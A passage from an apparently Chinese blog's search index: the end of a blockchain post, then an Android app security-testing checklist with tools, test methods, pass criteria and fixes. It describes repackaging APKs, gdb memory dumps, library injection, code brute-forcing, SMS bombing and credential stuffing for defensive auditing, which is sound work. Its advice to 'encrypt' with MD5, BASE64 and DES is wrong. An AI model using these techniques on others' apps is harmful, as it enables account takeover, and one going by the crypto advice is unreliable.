在分布式系统中,必然无法同时满足一致性(consistency)、可用性(Availability)、分区容忍性(Partition Tolerance), CAP三者最多得其二\nFootnotes 1 互联网是基于TCP/IP协议搭建起来的，而区块链的P2P网络依然使用的是TCP/IP协议，所以区块链是基于互联网的，它在互联网的基础上实现叠加和升级，是互联网的高级形态\n","description":"","id":24,"section":"en","tags":[""],"title":"关于区块链的认知","uri":"http://crkmythical.github.io/en/blog/%E5%85%B3%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E8%AE%A4%E7%9F%A5/"},{"content":"编写进度\n   Table of Contents  Android App安全基础  Android APP生成过程 安全测试工具  静态分析工具 - 测试App是否存在防反编译和防篡改的问题 动态分析工具 - 测试防调试、防注入、防内存转储、漏洞测试等问题 数据包分析工具- 测试数据通信时存在明文传输、数据弱加密、中间人攻击漏洞 挂钩工具 - 解决加密时上述工具无法使用的问题   App相关的信息资产   程序代码安全测试 - APP文件、程序进程  运行环境测试 防反编译测试  反编译工具检测 代码混淆检测 混淆强度检测 关键代码(敏感逻辑和数据保护)检测   防篡改测试  程序文件防篡改检测   防调试测试  调试工具防护检测 调试行为防护检测 内存防护检测   防注入测试  进程防护检测     服务交互安全测试 - 程序进程、前段界面、接口端口  进程间交互  检测目的 检测方法 检测结论 修复建议   屏幕交互  界面劫持检测 防截/录屏检测   WebView交互  克隆攻击检测 WebView安全检测   接口端口交互  对象反序列化检测 Wormhole漏洞检测     鉴权认证安全测试 - 接口端口、内存数据、网络通信  注册过程测试  注册信息保护检测 注册信息传输检测 注册过程防爆破检测 注册过程防嗅探检测   登陆过程测试  密码安全验证检测 登陆信息加密传输检测 登陆过程防爆破检测 登陆过程防嗅探检测 登陆过程防绕过检测 加强认证检测   会话过程测试  有状态会话标志检测 无状态会话Token检测 会话不活跃检测 加强认证检测   登出过程测试  会话终止检测 残留数据检测   注销过程测试  重新注册检测 数据清除检测     本地数据安全测试 - 内存数据、本地存储  数据创建测试  用户协议检测 数据采集检测 数据输入检测 数据生成检测   数据存储测试  访问控制检测 数据加密检测   数据处理测试  程序日志检测 敏感数据不当使用检测   数据共享测试  第三方SDK用户协议检测 与第三方SDK数据共享检测   数据备份测试  敏感数据备份检测 备份数据加密强度检测   数据销毁测试  后台运行数据检测 敏感数据清除检测     网络传输安全测试 - 网络通信  安全传输层测试  TLS实现检测 CA证书检测 证书校验检测 主机名校验   数据加密检测  检测目的 检测方法 检测结论 修复建议   中间人攻击测试  HTTP中间人会话劫持检测 HTTPS中间人会话劫持检测     App加固技术  \nAndroid App安全基础 \nAndroid APP生成过程 graph LR java[.java文件] --\u0026gt;|javac|cls[.class文件] cls[.class文件] --\u0026gt; dx[dx] jar[.jar文件] --\u0026gt; dx[dx] dx[dx] --\u0026gt; dex[class.dex] dex[class.dex] --\u0026gt;|dex2oat| oat[oat格式的class.dex文件] dex[class.dex] --\u0026gt;aapt[aapt] resource[resource] --\u0026gt;aapt[aapt] aapt --\u0026gt; .apk文件 .apk文件 --\u0026gt; jarsigner jarsigner--\u0026gt; zipalign zipalign --\u0026gt; signsign[signed .apk文件]   通过~javac~ 将java源代码生成字节码.class文件 通过~dx –dex –output=class.dex Test.class~将.class文件和jar包生成Android App可执行文件class.dex\noat格式文件是android系统自带的ELF文件格式，包括classes.dex文件内容，及classes.dex文件转换的机器指令，存储在~/data/dalbik-cache/arm/data@App@com.demo.test-1@test.apk@classes.dex~ 通过~aapt~将.dex文件和其他音视频资源文件打包成.apk文件 通过jarsigner对生成的apk文件进行数字签名，防止APP被篡改 通过zipalign使apk文件压缩部分在字节边界上使对齐  \n安全测试工具 \n静态分析工具 - 测试App是否存在防反编译和防篡改的问题   apktool 检测防篡改能力\n  反编译\njava -jar apktool.jar d -f Test.apk    重打包\njava -jar apktool.jar b -f directory_name -o Test.apk java -jar signapk.jar testkey.x509.pem testkey.pk8 old.apk new.apk      baksmali 作用 classes.dex -反编译-\u0026gt; smali\njava -jar baksmali.jar classes.dex -o smalifile    smail 作用 smali –\u0026gt; classes.dex\njava -jar smali.jar smalifile -o classes.dex    dex2jar 作用 dex –\u0026gt; jar\nsh d2j-dex2jar.sh -f ~/path/to/apk_to_decompile.apk    jd-gui 作用 展示jar包中源码\n  jeb 用于逆向工程/审计apk文件的反编译工具\n  \n动态分析工具 - 测试防调试、防注入、防内存转储、漏洞测试等问题  DDMS(Dalvik debug monitor service)是安卓开发环境中的Dalvik虚拟机调试监控服务 gdb(GNU project debugger)是LInux系统的GCC调试工具 IDA Pro 逆向神器 脱壳 Drozer是一个进行综合安全评估的Android安全测试框架  \n数据包分析工具- 测试数据通信时存在明文传输、数据弱加密、中间人攻击漏洞  Burpsuite/Fiddler Wireshark  \n挂钩工具 - 解决加密时上述工具无法使用的问题  Xposed框架1 在不修改APK文件的情况下控制程序运行 Frida 开源的跨平台挂钩框架，用来脱壳关键的函数，达到内存转储的目的 inject App进程注入评测工具  \nApp相关的信息资产  App文件2 程序进程 内存数据 前端界面3 本地存储 网络通信 交互接口 云端平台  \n程序代码安全测试 - APP文件、程序进程 \n运行环境测试4 \n防反编译测试5 \n反编译工具检测   检测目的\n检测App是否可以防止反编译工具，是否具有防逆向保护措施\n  检测方法\n 通过反编译工具对apk文件进行反编译，查看是否具有防逆向保护措施 通过IDA Pro等反汇编工具对动态库so文件进行反汇编，查看App是否具有防反汇编的能力    检测结论\n若App的dex文件和so文件无法正常反编译或者App经过加固处理，则通过测试\n  修复建议\n对App文件结构进行变形或加密，让反编译工具无法识别，或对App文件进行加固处理\n  \n代码混淆检测   检测目的\n检测App反编译后的源码是否经过混淆处理\n  检测方法\n通过反编译工具对apk文件进行反编译，查看代码中的类、字段和方法是否经过混淆处理\n  检测结论\n若反编译后源码中的类、字段和方法使用a、b、c、d等无意义的字符重命名，则通过测试\n  修复建议\n对App源码进行混淆处理\n  \n混淆强度检测   检测目的\n检测App反编译后的源码的混淆强度，查看是否能够有效地保护代码安全\n  检测方法\n 检测dex文件代码中所有的类名、函数名、字段、方法，是否都经过混淆处理，例如反编译后无法正常识别Java层函数的功能 检测so文件中所有类名、函数名、字段、方法，是否都经过混淆处理，例如反汇编后无法正常识别Native层函数功能    检测结论\n若反编译后代码*不能识别*出App函数的功能，则通过测试\n  修复建议\n针对dex文件和so文件的类名、函数名、字段、方法进行高强度混淆\n  \n关键代码(敏感逻辑和数据保护)检测   检测目的\n检测App是否对关键代码和数据实施有效的保护措施，是否暴露业务逻辑\n  检测方法\n通过反编译工具对apk文件进行反编译，结合manifest.xml配置文件，分析App注册、登陆、支付过程、加密算法、数据通信等关键功能代码，查看相关代码逻辑是否有明显的暴露\n  检测结论\n若App关键业务代码(如相关业务字符串)未暴露，且关键数据经过加密和隐藏保护处理，则通过测试\n  修复建议\n将App关键代码进行隐藏、混淆、加壳等处理，从而无法逆向出重要的代码信息\n  \n防篡改测试6 \n程序文件防篡改检测   检测目的\n检测App启动时是否进行了完整性校验，是否对客户端代码、资源文件进行修改，是否具有防篡改机制\n  检测方法\n 使用反编译工具Apktool对目标文件进行反编译\njava -jar apktool.jar d -f /path/to/test.apk 修改相关代码，篡改AndroidManifest.xml、assets文件、res文件等 使用apktool重新打包签名后再运行App查看运行结果\njava -jar apktool b -f /path/to/test    检测结论\n若打包后安装后*不能正常运行*，则通过测试\n  修复建议\n采用完整性校验技术对安装包进行校验，校验对象包括原包中代码、资源文件、配置文件等所有文件，一旦校验失败，立即退出\n  \n防调试测试7 \nTODO 调试工具防护检测   检测目的\n  检测方法\n  检测结论\n  修复建议\n  \nTODO 调试行为防护检测   检测目的\n  检测方法\n  检测结论\n  修复建议\n  \n内存防护检测   检测目的\n检测App内存是否具有内存防护功能，防止内存转储\n  检测方法\n 运行App，使用ps命令查看进程PID 使用 gdb -p \u0026lt;PID\u0026gt; 挂载App进程后，使用 (gdb) gcore 转储内存    检测结论\n若未生成corefile core.\u0026lt;pid\u0026gt; ,则通过测试\n  修复建议\n通过监控 /proc/pid/mem 和 /proc/pid/pagemep 来防止内存转储\n  \n防注入测试8 \n进程防护检测   检测目的\n检测App进程空间是否可以被注入第三方动态so文件\n  检测方法\n 运行App，通过注入工具或脚本，将第三方动态库文件注入App进程空间，查看第三方动态库是否在进程的内存空间中    检测结论\n若第三方动态库文件*不能注入*到目标进程空间，则通过测试\n  修复建议\n 增加ptrace函数的检测功能，使第三方无法使用该函数附加进程 修改linker中的dlopen函数，防止第三方进行so加载 定时检测App加载的第三方so库，若发现使被注入的so库，程序进程立即报异常    \n服务交互安全测试 - 程序进程、前段界面、接口端口 \n进程间交互 \n检测目的 检测进程间数据通信是否具有泄露用户信息的风险\n\n检测方法 查看AndroidManifest.xml文件中的、、、标签内的exported属性是否为false\n \u0026lt;activity android:exported=\u0026quot;true\u0026quot; 则可以被第三方App启动 \u0026lt;provider android:authorities=\u0026quot;com.bgy.ssm.fileprovider\u0026quot; android:exported=\u0026quot;true\u0026quot; 则可以被第三方app调用，实现增、删、改、查 \u0026lt;receiver android:exported=\u0026quot;true\u0026quot; 则可以接收第三方App发送的广播消息 \u0026lt;service android:enabled=\u0026quot;true\u0026quot; android:exported=\u0026quot;true\u0026quot; 则可以被第三方app启动  \n检测结论 客户端App用于跨进程通信的4种组建分别为Activity、ContentProvider、BroadCast、Service\n在 未明确要求 的情况下，只要以上配置中存在任一 exported=true 则测试 不通过\n\n修复建议 在未明确要求的情况下，在AndroidManifest.xml配置文件中设置该组建的exported属性为false，或对组建进行权限\n\n屏幕交互 \n界面劫持检测   检测目的\nApp是否具有防界面劫持(UI欺骗)功能，防止黑客伪造界面对原有界面进行覆盖，窃取用户和密码等敏感信息\n  检测方法\n  反编译源码，查看是否具有检测程序进入后台运行的代码, 当程序不是因为触摸返回键和HOME键今后后台运行时，提醒用户具有被劫持的风险\n@Override public boolean onKeyDown(int keyCode, KeyEvent event){ // 判断程序进入后台运行是否未触摸返回键和HOME键造成的 if((keyCode == KeyEvent.KEYCODE_BACK || keyCode == KeyEvent.KEYCODE_HOME) \u0026amp;\u0026amp; event.getRepeatCount()==0){ flag = false; } return super.onKeyDown(keyCode, event); } @Override protected void onPause(){ // 程序进入后台如果不是触摸返回键和HOME键造成的，则进行劫持风险提示 if(flag){ // 弹出警示信息 Toast.makeText(getApplicationContext(), \u0026quot;程序已经进入后台运行，具有劫持的风险\u0026quot;, Toast.LENGTH_SHORT).show(); } super.onPause(); }    编写透明界面，当运行至登陆、支付等界面时进行覆盖，查看是否具有风险提示\n    修复建议\n对App的UI界面进行校验，强制将自身UI时刻设置成顶层显示，其中HOME键除外，或自身UI界面进入后台运行后弹框提示用户App已经进入后台运行，有界面劫持风险\n  \n防截/录屏检测   检测目的\n检测App运行后是否存在防截/录屏保护措施\n  检测方法\n 通过 screencap 命令进行连续截屏，查看界面后的图片是否显示敏感信息 通过 screenrecord 命令进行录屏，查看录制后的视频是否显示敏感信息    修复建议\nApp要实现防截录屏的保护措施\n  \nWebView交互 \n克隆攻击检测   检测目的\n检测App中是否存在设置为可被导出的Activity组件，且组建中包含WebView调用，存在导致敏感信息泄露的风险\n  检测方法\n 通过JEB攻击反编译dex文件的源码，查看客户端是否使用了WebView空间，并将 setAllowFileAccessFromeFileURLs 或 setAllowUninvertedFileAccessFromFileURLs API设置为 true 检测file域的路径是否做了严格限制    检测结论\n若App使用WebView组建，并将 setAllowFileAccessFromeFileURLs 或 setAllowUninvertedFileAccessFromFileURLs API设置为 false ，则通过测试\n若App使用WebView组建，并将 setAllowFileAccessFromeFileURLs 或 setAllowUninvertedFileAccessFromFileURLs API设置为 true ，且file域的路径做了严格限制，则通过测试\n  修复建议\n严格限制包含WebView调用的Activity组建的导出权限，关闭导出权限或限制导出组建的发起者\n  \nWebView安全检测   检测目的\n检测App使用的WebView空间加载的外部资源是否存在潜在风险\n  检测方法\n检测App源码，查看客户端是否对WebView对空间加载的资源文件进行了校验，过滤风险代码\n  检测结论\nApp使用WebView空间减灾的HTML未明确要求使用Javascript，\n未对加载文件进行校验，或未使用安全的通信协议，\n并在WebView加载的程序中有实现发送短信，拨打电话等敏感行为的操作代码，则本项测试不通过\n  修复建议\n WebView加载的HTML页面，在未明确要求的情况下，禁用Javascript 对WebView加载的外部文件进行校验 采用HTTPS安全通信协议，不要在WebView加载的外部文件中实现敏感操作的代码    \n接口端口交互 \n对象反序列化检测   检测目的\n检测App是否使用安全的API实现序列化和反序列化，是否存在反序列化漏洞\n  检测方法\n 通过JEB工具反编译dex文件的源码，查看客户端App是否具有实现序列化和反序列化的源代码 检测实现序列化和反序列化的API是否具有潜在风险和漏洞    检测结论\n若客户端App不具有序列化和反序列化的代码，或实现序列化和反序列化的API不具有潜在风险和漏洞，则通过测试\n  修复建议\nApp采用安全框架的API实现序列化和反序列化\n  \nWormhole漏洞检测   检测目的\n检测App是否存在Wormhole漏洞\n  检测方法\n 检测App是否私自开启HTTP服务，是否进行身份认证 通过nmap工具扫描，检测App代码中是否开放某个TCP端口    检测结论\n如App私自开启了HTTP服务，开放某个TCP端口，同时该服务无身份认证，则本测试 不通过\n  修复建议\nApp关闭HTTP服务和端口，增加App的访问权限控制机制\n  \n鉴权认证安全测试 - 接口端口、内存数据、网络通信 \n注册过程测试 \n注册信息保护检测   检测目的\n检测App注册密码的复杂度(密码内容要求字母大小写、数字、特殊字符组合，长度等)和注册信息在本地存储时的保护程度是否足够高\n  检测方法\n  检测App注册密码的复杂度\npublic static boolean isPasswordChecked(CharSequence data){ return Pattern.compile(\u0026quot;^((a-z0-9A-Z)+[_]?){6,20}$\u0026quot;).matcher(data).find(); }    检测App在本地存储的注册信息是否加密存储，加密密钥是否进行了隐藏处理\n    检测结论\n如果对注册密码复杂度、长度进行了限制处理，且对本地存储的注册信息进行了加密保护，加密密钥隐藏，则通过测试\n  修复建议\n 对注册密码的复杂度和长度进行限制 对在本地存在的用户注册信息进行加密处理，隐藏加密密钥    \n注册信息传输检测   检测目的\n检测App将用户注册信息传输到服务器端的过程中是进行了加密保护\n  检测方法\n使用Burpsuite拦截App注册用户的数据包，查看数据包是否加密\n  检测结论\n若App在将用户注册信息传输到服务器端时进行了加密处理，则通过测试\n  修复建议\n在将用户注册信息传输到服务器端的过程中，对用户注册信息进行加密处理\n  \n注册过程防爆破检测   检测目的\n检测App在注册账户时，是否可以爆破获取正确的验证码，注册任意用户\n  检测方法\n在注册界面填写完注册信息后，点击“获取验证码”，使用抓包工具对其抓包，对数据包中的验证码进行暴力破解，爆破成功后，便可注册任意账号\n  检测结论\n若在注册App时验证码被爆破，可以任意注册账户，则本项测试不通过\n  修复建议\n 使用复杂的验证码，验证码长度不低于6位，包含数字及字母 对发送验证码请求进行时间和次数限制 验证码在传输时进行有效的加密处理    \n注册过程防嗅探检测   检测目的\n检测在App注册过程中是否可以利用已有社工库中的手机号、邮箱、用户名、密码等信息，通过撞库方式频繁嗅探注册账户\n  检测方法\n利用Burpsuite拦截注册用户时的数据包，分析查看是否暴露账户、密码参数，然后利用社工库数据替换账户、密码参数，进行撞库，从而获取用户注册\n  检测结论\n若在注册时暴露账户、密码参数，具有利用撞库对用户注册信息进行嗅探的风险，则本项测试不通过\n  修复建议\n 对传输的注册账户、密码等敏感信息进行强加密处理 服务器端限制访问次数    \n登陆过程测试 \n密码安全验证检测   检测目的\n检测App登陆密码的验证方案是在本地验证还是在服务器端验证，验证过程中是否加入了设备信息\n  检测方法\n利用JEB逆向分析App登陆功能的源码，分析密码验证中是否加密了设备信息IMEI\n  检测结论\n若密码验证在服务器端进行，且加入了设备信息，避免在非法设备登陆，则通过测试\n  修复建议\nApp登陆密码在服务器端进行验证，并加入设备信息，以降低用户登陆密码泄露的风险\n  \n登陆信息加密传输检测   检测目的\n检测App在将用户登录信息传输到服务器端的过程中是否进行了加密保护，以免被攻击者拦截网络流量，窃取用户登陆信息\n  检测方法\n使用Burpsuite拦截app登陆操作的数据包，分析是否明文传输用户信息\n  检测结论\n若App在将用户注册信息传输到服务器端时进行了加密处理，则通过测试\n  修复建议\nApp在将用户登陆信息传输到服务器端的过程中，要对用户登陆信息进行加密处理\n  \n登陆过程防爆破检测   检测目的\n检测App在登录时，是否可以抓取数据包，利用数据包中的验证码字段/密码字段进行暴力破解\n  检测方法\n检测App在登陆时，是否可以爆破验证码/密码，获取正确的验证码和登陆密码\n  检测结论\n若App在登陆时验证码和登陆密码可以被爆破，则本项测试不通过\n  修复建议\n 使用复杂的验证码和登陆密码 对发送验证码的请求进行时间和次数限制 对验证码、登陆密码进行输入错误次数限制 验证码、登录密码在传输时进行有效的加密处理    \n登陆过程防嗅探检测   检测目的\n检测App是否可以通过爆破验证码实现任意账户登陆、任意重置用户密码等操作\n  检测方法\n 验证码爆破检测\n在登陆界面填写完手机号等信息后点击“获取验证码”，使用抓包工具对其抓包，对数据中的验证码进行暴力破解，爆破成功后便可实现登陆任意账户、任意重置用户密码 短信轰炸检测\n在登陆界面填写完手机号等信息后点击“获取验证码”，若短信验证码无获取时间、获取次数限制，便可重放发送短信验证码数据进行短信轰炸 探测是否具有撞库风险\n利用工具拦截用户登陆时的数据包，分析查看是否暴露账户、密码参数，然后利用社工库数据替换账户、密码参数进行撞库，从而获取用户登陆信息    检测结论\n若App通过爆破验证码实现登陆任意账户、任意重置用户密码、短信炸弹，或通过撞库获取用户登陆信息，则此项测试 不通过\n  修复建议\n 使用复杂验证码、登陆密码 对发送验证码的请求进行时间和次数限制 对验证码输入错误次数进行限制 验证码在传输时进行有效的加密处理 服务端限制访问次数    \n登陆过程防绕过检测   检测目的\n检测App是否可以绕过验证码登陆任意账户、修改用户ID获取其他用户信息\n  检测方法\n 抓取登陆成功后的响应包，之后退出，在登陆其他用户账户时，用登陆成功的响应包替换登陆失败的数据包，检测是否可以绕过验证码、密码验证，进而成功登陆其他用户的账户 修改用户ID，检测是否可以获取任意用户信息，若用户身份认证采用单一ID值判断，攻击者可以修改数据包中的用户ID进行重放，从而获取其他用户信息    检测结论\n若App可以绕过验证码登陆其他用户，或可以修改用户ID获取其他用户信息，则本项测试 不通过\n  修复建议\n加强身份验证机制，使用Token或Session机制，设置访问控制策略，敏感数据采用高强度加密传输\n  \n加强认证检测   检测目的\n检测App客户端是否具有双因子认证机制，保护用户登陆信息\n  检测方法\n 检测App在登陆时，是否具有双因子认证机制(密码+令牌/指纹/设备信息/短信) 使用用户登陆信息在新设备登陆时，查看是否具有短信提醒    检测结论\n如Apple具有双因子认证机制和不同设备登录时的短信提醒认证机制，则通过测试\n  修复建议\nApp采用双因子认证机制和不同设备登陆短信提醒认证机制，保护用户登陆信息安全\n  \n会话过程测试 \n有状态会话标志检测   检测目的\n检测客户端与服务器端交互的会话，是否存在复杂的会话ID，同时服务器是否对其进行校验\n  检测方法\n 模拟客户端与服务器端登陆，查看是否采用 简单的Sessionid方式标识 客户端 利用服务端返回的 _Sessionid构建新的URL 访问服务器端，查看是否能够绕过验证 查看客户端与服务器交互时是否采用 *复杂的Key*，是否存在时间有效性校验，防止被伪造    检测结论\n若客户端与服务器端会话时采用来复杂加密的Key，同时服务器端对客户端发送的Key进行了校验，攻击这无法伪造，服务器端无响应，则通过测试\n  修复建议\n客户端与服务器端通信会话时采用复杂的算法对随机的Sessionid进行加密，同时服务器端对随机的Sessionid进行校验\n  \n无状态会话Token检测   检测目的\n在客户端与服务器端通信会话过程中，检测是否存在Token机制，是否容易被攻击者截取利用\n  检测方法\n 检测客户端与服务器端通信会话的URL中是否使用携带Token，Token是否明文显示 检测客户端与服务器端认证的复杂性，是否采用类似 UID+Toekn+timestamp+密钥 的Toekn机制，并尝试破解    检测结论\n若客户端与服务器端通信会话的Toekn能被轻易获取利用或被破解，则本项测试不通过\n  修复建议\n 每次登陆时重新生成Token，并设置有效期，每次操作后更新Token的时间戳，保证Token有效期往后延续 为了避免Token被截获，伪造非法请求，在每次请求时，建议采用 UID+Token+timestamp+密钥+请求参数签名 ，服务器同时验证Token和签名，以保证请求的安全性    \n会话不活跃检测   检测目的\n若客户端与服务器端通信临时终端或长时间不活跃，检测服务器是否立即终止会话\n  检测方法\n 在客户单与服务器端通信过程中，若长时间不操作，然后再操作时，查看客户端与服务器端是否已中断 在客户单与服务器端通信过程中，若临时中断，例如打开微信等其他操作，让服务在后台运行，查看客户端与服务器端是否已中断    检测结论\n若客户端与服务器端通信临时中断或长时间不活跃时，服务器端立即与客户端中断会话，需要重新认证，则本项测试结果为通过\n  修复建议\n在客户端与服务器端通信会话过程中，增加时间的有效性，例如设置时间为5min，若客户端与服务器长时间不活跃或者客户端服务在后台运行，服务器立即中断本次会话\n  \n加强认证检测   检测目的\n在客户端与服务器端进行敏感交易时，检测服务器端是否存在双因子身份认证机制\n  检测方法\n 检测客户端与服务器端进行支付、转账等敏感交易时，客户端是否需要多个身份认证方式，同时服务器端是否对其双因子进行校验 检测客户端与服务器端进行身份认证过程中，数据是否进行加密处理，加密强度如何    检测结论\n若客户端与服务器端存在双因子身份认证，则通过测试\n  修复建议\nApp中涉及敏感用户信息的界面，要求使用双因子身份认证机制，例如采用支付密码和用户预留短信验证码等认证方式\n  \n登出过程测试 \n会话终止检测   检测目的\n在用户执行登出操作后，检测服务器端是否立即终止与客户端之间的会话连接\n  检测方法\n 登陆App，执行一些需要在App进行身份验证的操作，并拦截 退出App 重放步骤1中的操作，显示错误消息或重定向到登录页面    检测结论\n若在客户端用户执行登出操作后，服务器立即终止与客户端之间的会话连接，需要用户重新进行登陆认证\n  修复建议\n在用户执行登出操作后，立即终止客户端与服务器端的会话连接\n  \n残留数据检测   检测目的\n当用户执行登出操作后，检测服务器是否及时删除客户端对应的Token或Sessionid\n  检测方法\n操作客户端登出功能，通过用户名、密码、及之前的Token值或Sessionid值能够登陆成功，则本项测试不通过\n  检测结论\n在用户执行登出操作后，若客户端使用之前的Token或Sessionid值能够登陆成功，则本项测试不通过\n  修复建议\n当用户执行登出操作后，服务端及时删除户端对应的Token或Sessionid值\n  \n注销过程测试 \n重新注册检测   检测目的\n检测在客户端注销后，使用相同账户能否重新注册\n  检测方法\n 检测客户端是否存在注销功能 在客户单注销之后，使用相同账户注册，查看是否可以重新注册，测试第三方关联的账户是否也已经注销，还能否正常登陆    检测结论\n若注销账户后仍可以使用相同的账户注册，关联的第三方数据无法使用，则通过测试\n  修复建议\n在客户端注销操作后，可以使用相同账户重新注册，确认原来的账户信息已经清除\n  \n数据清除检测   检测目的\n检测在App卸载后，本地存储的数据或账户缓存等信息是否全部清除\n  检测方法\n 安装App，先注册，登录试用，然后卸载，查看本地注册的用户账户信息等数据是否及时删除 重新安装App，查看使用之前的账户和密码是否可以直接登陆    检测结论\n若卸载App后，本地数据完全及时清除，则通过测试\n  修复建议\n在App卸载后，及时删除本地存储的全部数据\n  \n本地数据安全测试 - 内存数据、本地存储 \n数据创建测试 \n用户协议检测   检测目的\n检测App是否存在用户协议声明。若存在，是否对使用用户信息用户及保护措施进行声明，是否存在违规行为\n  检测方法\n 安装运行App，试用App的所有主要功能，并抓包，通过数据包和源代码了解其行为特征 查看是否存在用户协议，以及协议内容是否声明App需要手机的用户信息及保护措施    检测结论\n若App存在用户服务协议，且声明了用户信息用途及保护措施，则通过测试\n  修复建议\nApp手机用户个人信息前，必须在用户服务协议中声明，需要收集用户设备的哪些信息、具体用途、及保护用户信息的安全措施和具体承诺\n  \n数据采集检测   检测目的\n检测App是否过度申请系统敏感权限，使用该权限时是否提示用户授权，是否过度手机用户数据，数据传输过程是否安全\n  检测方法\n 查看AndroidManifest.xml文件标签，分析App所申请的系统权限，是否存在过度申请的敏感权限 查看App调用系统的敏感权限时是否提示用户授权 分析App源码及数据包内容，查看是否过度收集在用户协议声明范围外的用户数据，确认数据传输过程中的安全性    检测结论\n若App无过度申请系统敏感权限，且在使用该权限时提示用户授权，同时没有过度收集用户数据，则通过测试\n  修复建议\nApp发布时需要删除不需要的系统敏感权限，在申请系统敏感权限时，需要提示用户授权，不得私自上传在协议中未声明的用户信息\n  \n数据输入检测   检测目的\n检测App是否实现了自带的安全键盘，且启动键盘时数字是否随机分布，关键的输入框是否禁用复制粘贴功能，是否存在验证码校验机制，验证码是否安全\n  检测方法\n 检测App是否实现了自定义软键盘，在每次启动时按键数字随机分布，且按键时不存在按键阴影，按键回显等特效 检测要求输入敏感数据(登陆密码、支付密码、银行卡账户等)输入框禁用复制粘贴功能 检测验证码是否由图形验证码或短信验证码组成，是否通过服务器端返回给客户端    检测结论\n若App实现了自定义软键盘，键盘数字实现了随机分布，具有安全的验证码，同时密码输入框禁用了复制粘贴功能，则通过测试\n  修复建议\n App客户端实现自定义的软键盘，软键盘每次启动时都要随机分布，且按键无回显、阴影等特效 要求输入登陆、支付密码、银行卡账户等输入框禁用复制粘贴功能 设置 android:longClickable=\u0026quot;false\u0026quot; 关闭其功能 增加复杂图形验证码或短信验证码，且在传输过程中对数据进行加密    \n数据生成检测   检测目的\n检测App生成数据的存储形式时是结构话还是非结构话，数据是否经过加密后存储\n  检测方法\n 检测App生成的结构化数据，要求数据内容加密后存储 检测App生成的非结构化数据，要求数据内容加密后存储    检测结论\n若本地存储的数据经过加密处理，则通过测试\n  修复建议\n不管生成的数据是采用结构化还是非结构化形式存储，都要求加密后存储\n  \n数据存储测试 \n访问控制检测   检测目的\n检测App是否具备完善的权限管理机制，是否能够与其他App隔离，是否在权限允许的范围之外存在数据被其他客户端访问的风险\n  检测方法\n查看App本地存储文件的权限\nls -al files # 本地存储file文件权限 ls -al shared_pref # 本地存储xml文件权限 ls -al app_webview # 本地存储的cache文件权限 ls -al databases # 本地存储的db文件权限    检测结论\n如客户端具备完善的权限管理机制，以最小权限为原则，则通过测试\n  修复建议\nApp客户端严格控制本地生成敏感数据访问权限，避免被第三方App非法访问导致用户信息泄露\n  \n数据加密检测   检测目的\n检测App在本地存储的用户信息是否经过了加密处理，加密密钥是否进行了保护，加密算法是否合理，生成的随机数强度是否较高，避免造成用户信息泄露风险\n  检测方法\n检测App在本地生成的数据文件是否加密，检测App在本地存储的文件是否加密\n  检测结论\n若本地数据进行了加密处理，加密密钥进行了保护处理，且采用多种加密算法组合加密，对不同的数据采用了不同的加密算法，采用安全的方式生成随机数，则通过测试\n  修复建议\n 对App在本地存储的用户信息进行加密处理 对对称加密算法的加密密钥进行加密保护和隐藏处理 对APp在本地存储的用户信息进行多重加密，并对用户数据采用多种加密方式 避免使用不安全的随机数生成类 避免使用不安全的加密算法    \n数据处理测试 \n程序日志检测   检测目的\n检测App源码中的调试信息是否关闭，在调试信息中是否写入敏感信息\n  检测方法\n  反编译源码，查看是否存在日志调试代码，要求不得存在日志调试代码\nprivate void save(){ String mName=etUsername.getText().toString(); String mPwd=etPwd.getText().toString(); mEditor.putString(\u0026quot;Name\u0026quot;,mName); mEditor.putString(\u0026quot;Pwd\u0026quot;,mPwd); mEditor.commit(); Log.d(\u0026quot;TEST\u0026quot;,\u0026quot;本地存储\u0026quot;+\u0026quot;用户名\u0026quot;+mName+\u0026quot;密码\u0026quot;+mPwd); }    动态运行App客户端，使用~logcat~查看后台打印日志是否存在用户敏感数据，要求后台不得打印日志调试信息\n    检测结论\n若App关闭了源码中的调试信息，则通过测试\n  修复建议\nApp发布时应删除源码中的日志调试代码\n  \n敏感数据不当使用检测   检测目的\n检测App源码和行为特征是否符合App安全相关标准的规定\n  检测方法\n反编译App代码，查看是否私自手机用户敏感信息，抓包拦截，检测是App是否私自上传用户隐私到服务器\n  检测结论\n逆向分析源码和数据包，若符合App安全相关标准的规定，则通过测试\n  修复建议\nApp源码要进行严格审核处理，禁止在用户未知情的情况下私自收集用户信息\n  \n数据共享测试 \n第三方SDK用户协议检测   检测目的\n检测在App服务协议中是否声明第三方SDK收集用户信息的用途，是否过度收集用户个人信息\n  检测方法\n查看用户协议内容是否声明共享用户信息给第三方SDK，并通过抓包查看第三方SDK的行为特征\n  检测结论\n若用户协议中明确声明App信息与第三方共享情况，则通过测试\n  修复建议\nApp要明确声明是否会与第三方共享用户信息，以及共享用户信息的具体用途\n  \n与第三方SDK数据共享检测   检测目的\n检测App是否在用户未知情的情况下，私自共享用户个人信息给第三方SDK，以及第三方SDK是否私自收集用户个人信息到指定服务器\n  检测方法\n 分析App源码和数据包，查看是否在用户未知情的情况下，将收集的用户信息私自上传至第三方服务器 分析App嵌入的第三方SDK源码和数据包，查看是否存在第三方SDK在用户不知情的情况下，将收集的用户信息私自上传至第三方服务器    检测结论\n若分析源码内容和数据包后，符合App安全相关标准的规定，则通过测试\n  修复建议\n在App共享数据给第三方SDK的服务协议之外，禁止App和第三方SDK私自采用短信或数据包等形式，收集用户信息并上传到指定服务器\n  \n数据备份测试 \n敏感数据备份检测   检测目的\n检测App应用数据是否可以备份，是否能够防止攻击者复制App数据\n  检测方法\n查看Androidmanifest.xml文件中的allowBackup属性是否为true\n\u0026lt;application android:allowBackup=\u0026quot;true\u0026quot;\n  检测结论\n在App不具备备份功能的情况下，若 \u0026lt;application android:allowBackup=\u0026quot;false\u0026quot; 则通过测试\n  修复建议\n在App不具备备份功能的情况下，应将 \u0026lt;application android:allowBackup=\u0026quot;false\u0026quot;\n  \n备份数据加密强度检测   检测目的\n检测App备份的数据是否进行加密处理，并且要求使用复杂的加密强度高的算法\n  检测方法\n若采用对称算法加密，则判断对称算法的密码是否存储安全，加密算法的源代码是否可以被破解\n  检测结论\n若App备份的数据进行了加密处理，则通过测试\n  修复建议\n采用多种混合算法加密，例如AES256,MD5,HASH,DES,BASE64\n  \n数据销毁测试 \n后台运行数据检测   检测目的\n检测App客户端在切入后台运行时是否对收集存储的文件、数据库、配置文件、缓存文件等进行及时清理操作\n  检测方法\n App切入后台运行时，查看本地生成的db文件、xml文件或者内存中的数据是否进行了删除 导出本地的缓存信息文件，查看是否有敏感信息暴露    